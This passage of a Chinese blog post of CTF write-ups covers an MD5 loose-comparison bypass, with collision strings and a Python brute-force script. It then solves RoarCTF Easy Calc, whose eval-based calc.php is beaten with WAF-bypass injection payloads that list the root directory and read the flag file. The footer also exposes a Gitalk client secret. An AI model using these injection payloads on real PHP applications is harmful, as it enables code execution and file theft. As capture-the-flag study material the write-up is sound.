'</span>.md5((readmyfile(<span class="string">"11"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"11"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"11"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/A8mGCDltFzIkujK.png" alt=""></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056</span><br><span class="line"></span><br><span class="line">URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81</span><br><span class="line"></span><br><span class="line">URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935</span><br><span class="line"></span><br><span class="line">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056</span><br><span class="line"></span><br><span class="line">URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81</span><br><span class="line"></span><br><span class="line">URLENCODE hash 6b9eaae07963a665dcc4cabcad530507</span><br><span class="line"></span><br><span class="line">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056</span><br><span class="line"></span><br><span class="line">URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81</span><br><span class="line"></span><br><span class="line">URLENCODE hash 559062db66b89ca9e98b3900fc75066e</span><br></pre></td></tr></table></figure>

<p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p>
<p><img src="https://i.loli.net/2020/03/26/YmHzV1kMryAT23w.png" alt=""></p>
<p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p>
<p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p>
<p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p>
<p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                        payload = (i+j+m+n+k).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                        str1 = hashlib.md5(payload)</span><br><span class="line">                        test1 = str1.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> test1[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span> <span class="keyword">and</span> test1[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            print(<span class="string">"&#123;&#125;-&gt;&#123;&#125;"</span>.format(payload,test1))</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                        payload = (i+j+m+n+k).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                        str1 = hashlib.md5(payload)</span><br><span class="line">                        test2 = str1.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> test2[<span class="number">1</span>] == <span class="string">"e"</span> <span class="keyword">and</span> test2[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            print(<span class="string">"&#123;&#125;-&gt;&#123;&#125;"</span>.format(payload,test2))</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a()</span><br><span class="line">    b()</span><br></pre></td></tr></table></figure>

<p>得到的两个结果：</p>
<p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p>
<p>于是构造payload：</p>
<p><img src="https://i.loli.net/2020/03/26/VeCyFHRv6gtrNMA.png" alt=""></p>
<p>发包得到flag</p>
<h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://i.loli.net/2020/03/26/XuHCYU1QhOmJjKV.png" alt=""></p>
<p>查看源代码后发现存在<code>calc.php</code></p>
<p><img src="https://i.loli.net/2020/03/26/7hItzkUQ2niOAMo.png" alt=""></p>
<p>访问得到后台源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p>
<blockquote>
<p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p>
</blockquote>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/6654#toc-1" target="_blank" rel="noopener">从一道题到协议层攻击之HTTP请求走私</a></li>
<li><a href="https://blog.csdn.net/yankai0219/article/details/8269922" target="_blank" rel="noopener">http协议中content-length 以及chunked编码分析</a></li>
<li><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></li>
</ul>
<h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote>
<p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=var_dump(base_convert(61693386291,10,36)(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/VKmzCTMPjrql56t.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/jTtwYx6EiCNeuBG.png" alt=""></p>
<h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p>
<blockquote>
<ul>
<li>删除初始空格</li>
<li>将某些字符转换为下划线（包括空格）</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/eiZEwfv6rm1MyFp.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/26/fPgRS4jI8pOZdAT.png" alt=""></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Extrader</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.extrader.top/2020/03/01/%E5%85%B6%E5%AE%83/">https://www.extrader.top/2020/03/01/%E5%85%B6%E5%AE%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.extrader.top">Extrader</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF%E9%A2%98/">CTF题</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/03/CVE/"><i class="fa fa-chevron-left">  </i><span>CVE</span></a></div><div class="next-post pull-right"><a href="/2020/02/22/%E4%B8%80%E4%BA%9B%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"><span>一些排序和查找算法</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: 'dcbaba23dd5d2cbb1cc2',
  clientSecret: '39bc1e41152f9936638fa5d9f2c542ac945d9fe1',
  repo: 'Extrader-home.github.io',
  owner: 'Extrader-home',
  admin: 'Extrader-home',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2020/03/28/nt9OgCF3k8DPRB7.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Extrader</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="90" alpha="0.6" zIndex="-1" data-click="true"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>